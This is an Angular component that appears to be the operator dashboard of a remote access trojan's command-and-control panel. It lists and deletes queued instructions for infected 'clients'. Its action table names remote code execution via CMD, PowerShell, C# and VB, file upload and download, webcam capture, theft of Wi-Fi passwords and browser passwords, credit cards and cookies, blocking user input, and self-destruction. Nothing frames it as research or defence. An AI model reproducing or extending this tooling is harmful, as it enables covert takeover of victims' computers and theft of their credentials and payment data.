import { Component, OnInit } from '@angular/core';
import { ClientService } from '../../../services/client.service';
import { ActivatedRoute, Router } from '@angular/router';
import { Instruction } from '../../../models/instruction.module';
import { CommonModule } from '@angular/common';
import { CreateInstructionComponent } from './create-instruction/create-instruction.component';
import { ToastService } from '../../../../toast.service';
@Component({
  selector: 'app-instructions',
  standalone: true,
  imports: [
    CommonModule,
    CreateInstructionComponent,
    CreateInstructionComponent,
  ],
  templateUrl: './instructions.component.html',
  styleUrl: './instructions.component.scss',
})
export class InstructionsComponent implements OnInit {
  ClientId: string | null = null;
  Instructions: Instruction[] = [];
  ErrorMessage: string = '';
  constructor(
    private clientService: ClientService,
    private route: ActivatedRoute,
    private router: Router,
    private toastService:ToastService
  ) {}
  ngOnInit(): void {
    this.route.paramMap.subscribe((params) => {
      this.ClientId = params.get('id');
      this.LoadData();
    });
  }
  LoadData() {
    if (this.ClientId != null) {
      const instructionsReq = this.clientService.getClientActions(
        this.ClientId
      );
      if (instructionsReq != null) {
        instructionsReq.subscribe(
          (response) => {
            this.Instructions = response;
          },
          (error) => {
            if (error.status == 401) {
              this.ErrorMessage = 'Try To Login Again';
              this.router.navigate(['/Logout']);
            } else if (error.status == 404) {
              this.ErrorMessage = 'Not Found';
              this.router.navigate(['/Client']);
            } else {
              this.ErrorMessage = 'Something went wrong....';
            }
          }
        );
      }
    }
  }
  GetActionDescription(optionValue:number)
{
    switch (optionValue)
    {
        case 0:
            return "Upload From Target";
        case 1:
            return "Download To Target";
        case 2:
            return "Execute CMD";
        case 3:
            return "Execute Powershell";
        case 4:
            return "Webcam";
        case 5:
            return "Grab Wifi Passwords";
        case 6:
            return "Grab Browsers Passwords";
        case 7:
            return "Grab Browsers Credit Cards";
        case 8:
            return "Grab Browsers Cookies";
        case 9:
            return "Execute C# Code";
        case 10:
            return "Execute VB Code";
        case -1:
            return "Destroy Himself";
        case -2:
            return "Update Info";
        case 11:
              return "Mute / Unmute Sound";
        case 12:
              return "Volume Up";
        case 13:
              return "Volume Down";
        case 14:
              return "Block User Input";
        case 15:
              return "Unblock User Input";
        case 16:
              return "Shutdown";
        case 17:
              return "Restart";
        default:
            return "Invalid Option";
    }
}

  DeleteAction(id: number) {
    if (this.ClientId != null) {
      const deleteReq = this.clientService.DeleteClientAction(
        this.ClientId,
        id
      );
      if (deleteReq != null) {
        deleteReq.subscribe(
          (reponse) => {
            this.Instructions=[];
            this.LoadData();
            this.toastService.showToast("Operation has been done successfully!");
          },
          (error) => {
            if (error.status == 401) {
              this.ErrorMessage = 'Try To Login Again';
              this.router.navigate(['/Logout']);
            } else if (error.status == 404) {
              this.ErrorMessage = 'Not Found';
              this.router.navigate(['/Client/Instructions/' + this.ClientId]);
            } else {
              this.ErrorMessage = 'Something went wrong....';
            }
          }
        );
      }
    }
  }
  DeleteAllActions() {
    if (this.ClientId != null) {
      const deleteReq = this.clientService.DeleteClientAllAction(this.ClientId);
      if (deleteReq != null) {
        deleteReq.subscribe(
          (reponse) => {
            this.Instructions=[];
            this.LoadData();
            this.toastService.showToast("Operation has been done successfully!");

          },
          (error) => {
            if (error.status == 401) {
              this.ErrorMessage = 'Try To Login Again';
              this.router.navigate(['/Logout']);
            } else if (error.status == 404) {
              this.ErrorMessage = 'Nothing Found';
              this.router.navigate(['/Client/' + this.ClientId]);
            } else {
              this.ErrorMessage = 'Something went wrong....';
            }
          }
        );
      }
    }
  }
  truncate(value: string, limit: number = 25): string {
    return value.length > limit ? value.substring(0, limit) + '...' : value;
  }
  isModalOpen = false;
  ActionName:string=""
  ActionsArgs:string=""
  ActionID:number=0;
  ShowInstruction(inst:Instruction){
    this.ActionName=this.GetActionDescription(inst.code);
    this.ActionID=inst.instructionId;
    this.ActionsArgs=inst.functionArgs==""?"No Args":inst.functionArgs;

    this.isModalOpen=true;
  }
  onBackgroundClick(event: MouseEvent) {
    if (event.target === event.currentTarget) {
      this.isModalOpen = false;;
    }
  }

  onCloseClick() {
      this.isModalOpen = false;;
  }
}
